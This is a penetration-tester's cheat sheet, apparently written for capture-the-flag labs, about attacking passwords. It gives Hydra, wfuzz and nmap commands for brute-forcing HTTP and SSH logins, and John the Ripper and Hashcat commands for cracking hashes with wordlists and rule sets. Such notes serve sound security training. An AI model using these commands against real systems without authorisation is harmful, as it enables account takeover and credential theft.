## Passwords

### Basics

1. default creds
2. 'password'
3. Try the hostname
4. admin/admin
5. Any previous passwords found (remember to try SSH with them!)
6. See if there are password files specific to your platform

### HTTP Bruteforce

#### Hydra

1. Use burpsuite to capture the login traffic to form the command for Hydra.

2. Craft the Hydra statement using the correct login URI, form names, and failure message.  If it is throttling, you can tell it to wait between attempts and not use parallel guesses.

   ```bash
   # Examples
   
   # Basic HTTP authentication (login popup) - be sure it doesn't redirect you to another login page
   hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -f 10.10.10.95 -s 8080 http-get /manager/html
   
   # Login form, parameters obtained from Burp
   hydra 10.10.10.75 http-form-post -m "/admin.php:user=^USER^&pass=^PASS^:Incorrect username" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
   
   # Login form, parameters obtained from Burp
   hydra 10.10.10.75 http-form-post -m "/webservices/monstra-3.0.4/admin/:login=^USER^&password=^PASS^:Incorrect username" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
   
   # Options
   http-form-post 
   -m "URI:field=value:FailureMessage"	# Module options
   H=Cookie: PHPSESSID=a9blgb5agnp8fq03frrbuk5oe7 # Put in field for cookies
   -f	# Exit after first match
   -t N # Runs N tasks in parallel, defaults to 16
   ## For username options, insert ^USER^ into the form post data where the username goes.
   -W N # Waits N seconds between login attempts
   -l admin	# Specify single username
   -L users.txt	# Supply usernames in a file
   ## For password options, insert ^PASS^ into the form post data where the password goes.
   -p pass		# Specify single password
   -P pass.txt	# Supply passwords in a file
   -s PORT		# Specify a port if non-standard
   -S			# Connect using SSL
   ```

#### WFUZZ

```bash
wfuzz -c --sc 200 -z file,/usr/share/wordlists/rockyou.txt -d 'login=admin&password=FUZZ&login_submit=Log+In' -u http://10.10.10.88/webservices/monstra-3.0.4/admin/ -v --oF wfuzz.txt
```

### SSH Bruteforce

#### Hydra

```bash
hydra -l sammy -P /usr/share/wordlists/rockyou.txt 10.10.10.76 ssh -s 22022

# Options
-l	# Specify login username
-P	# Password file
-s  # Specify port
ssh # Target as PROTOCOL://IP
```

#### Nmap

```bash
# A site shared this, but it didn't do anything for me
nmap 10.10.10.76 -p 22022 --script ssh-brute --script-args userdb=sammy,passdb=/usr/share/wordlists/rockyou.txt
```

### Cracking

#### Identify Hash

```bash
hashid -j HASH
```

#### John The Ripper

1. Identify the hash

   ```bash
   hash-identifier
   ```

2. Create a file with the hash

   ```bash
   # NTLM Format
   username:NTLMHash
   ```
   
3. Crack the wordlist, which is generally going to take one of these routes:

   - Cracking with usual wordlists (rockyou.txt)

      ```bash
      # Specify NT format with Windows, otherwise no need
      john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=NT
      # Check results
      john --show hashes.txt
      
      # Options
      john --list=formats	# Shows various password formats
      # Common formats: Raw-SHA256, NT, Raw-MD5
      ```

   - Make a word list with cewl

   - Password is not meant to be cracked

4. Show the results of John

   ```bash
   john --show hash.txt
   ```


For unsalted hashes, use https://crackstation.net/

#### HashCat

You need to tell Hashcat what mode to run in.  List of modes:  

- https://hashcat.net/wiki/doku.php?id=example_hashes

- Other useful info: https://github.com/frizb/Hashcat-Cheatsheet

<u>Basic wordlist crack</u>

```bash
hashcat â€“m 0 HASHFILE /usr/share/wordlists/rockyou.txt
# Options
-m 3200 # Specifies hash type, see URL below for other ID's
```

<u>Run with rules:</u>

- From https://github.com/NotSoSecure/password_cracking_rules

  ```bash
  hashcat --force -m 3200 hash.txt wordlist.txt --status -w3 -o found.txt --remove --potfile-disable -r ~/opt/wordlists/hashcat/rules/OneRuleToRuleThemAll.rule -o cracked.txt
  
  # Options
  -r # Specify rules file
  ```

- hob0rules:  https://github.com/praetorian-code/Hob0Rules

  - hob064 This ruleset contains 64 of the most frequent password patterns used to  crack passwords. Need a hash cracked quickly to move on to more testing? Use this list.

    ```bash
    hashcat -a 0 -m 1000 <NTLMHASHES> wordlists/rockyou.txt -r hob064.rule -o cracked.txt
    ```

  - d3adhob0 This ruleset is much more extensive and utilizes many common password  structure ideas seen across every industry. Looking to spend several  hours to crack many more hashes? Use this list.

    ```bash
    hashcat -a 0 -m 1000 <NTLMHASHES> wordlists/english.txt -r d3adhob0.rule -o cracked.txt
    ```


<u>Restoring a session</u>

```bash
# You can start a session and give it a name like 
hashcat --session session_name -a 0 -m 1000 <NTLMHASHES> wordlists/english.txt -r d3adhob0.rule -o cracked.txt

# Then restore with
hashcat --session session_Name --restore

# If no session name was specified, use
hashcat --restore
```

